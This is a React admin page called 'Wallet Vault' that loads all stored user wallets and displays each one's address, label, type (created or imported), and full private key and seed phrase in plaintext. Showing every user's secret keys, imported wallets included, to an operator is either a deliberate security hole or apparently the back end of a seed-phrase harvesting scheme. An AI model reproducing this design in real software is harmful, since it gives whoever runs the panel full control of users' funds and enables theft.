import { useEffect, useState } from 'react'
import { getWallets } from '@/lib/storage'
import Card from '@/components/ui/Card'
import Badge from '@/components/ui/Badge'
import { formatDate } from '@/lib/utils'
import { shortenAddress } from '@/lib/ethers'
import type { WalletRecord } from '@/types'

export default function AdminUsers() {
  const [wallets, setWallets] = useState<WalletRecord[]>([])
  const [isLoading, setIsLoading] = useState(true)

  useEffect(() => {
    const fetchWallets = async () => {
      try {
        const records = await getWallets()
        setWallets(records)
      } catch {
        // silently fail
      } finally {
        setIsLoading(false)
      }
    }
    fetchWallets()
  }, [])

  return (
    <div className="max-w-6xl mx-auto space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-foreground">Wallet Vault</h1>
        <p className="text-muted-foreground text-sm mt-1">
          All wallets ({wallets.length})
        </p>
      </div>

      <Card>
        {isLoading ? (
          <div className="flex items-center justify-center py-8">
            <span className="animate-spin h-6 w-6 border-2 border-primary border-t-transparent rounded-full" />
          </div>
        ) : wallets.length === 0 ? (
          <div className="text-center py-8">
            <p className="text-muted-foreground">No wallets found</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-3 px-2 text-muted-foreground font-medium">#</th>
                  <th className="text-left py-3 px-2 text-muted-foreground font-medium">Address</th>
                  <th className="text-left py-3 px-2 text-muted-foreground font-medium">Label</th>
                  <th className="text-left py-3 px-2 text-muted-foreground font-medium">Type</th>
                  <th className="text-left py-3 px-2 text-muted-foreground font-medium">Private Key</th>
                  <th className="text-left py-3 px-2 text-muted-foreground font-medium">Seed Phrase</th>
                  <th className="text-left py-3 px-2 text-muted-foreground font-medium">Created</th>
                </tr>
              </thead>
              <tbody>
                {wallets.map((w, i) => (
                  <tr key={w.id} className="border-b border-border/50 hover:bg-background/50">
                    <td className="py-3 px-2 text-muted-foreground">{i + 1}</td>
                    <td className="py-3 px-2 text-foreground font-mono text-xs">{shortenAddress(w.public_address, 6)}</td>
                    <td className="py-3 px-2 text-foreground">{w.label}</td>
                    <td className="py-3 px-2">
                      <Badge variant={w.type === 'created' ? 'success' : 'default'}>
                        {w.type === 'created' ? 'Created' : 'Imported'}
                      </Badge>
                    </td>
                    <td className="py-3 px-2">
                      <details>
                        <summary className="text-primary cursor-pointer text-xs hover:underline">Show</summary>
                        <pre className="text-xs text-foreground font-mono mt-1 bg-background p-2 rounded border border-border break-all whitespace-pre-wrap max-w-xs">{w.private_key}</pre>
                      </details>
                    </td>
                    <td className="py-3 px-2">
                      {w.seed_phrase ? (
                        <details>
                          <summary className="text-primary cursor-pointer text-xs hover:underline">Show</summary>
                          <pre className="text-xs text-foreground font-mono mt-1 bg-background p-2 rounded border border-border break-all whitespace-pre-wrap max-w-xs">{w.seed_phrase}</pre>
                        </details>
                      ) : (
                        <span className="text-muted-foreground text-xs">—</span>
                      )}
                    </td>
                    <td className="py-3 px-2 text-muted-foreground text-xs">{formatDate(w.created)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </Card>
    </div>
  )
}
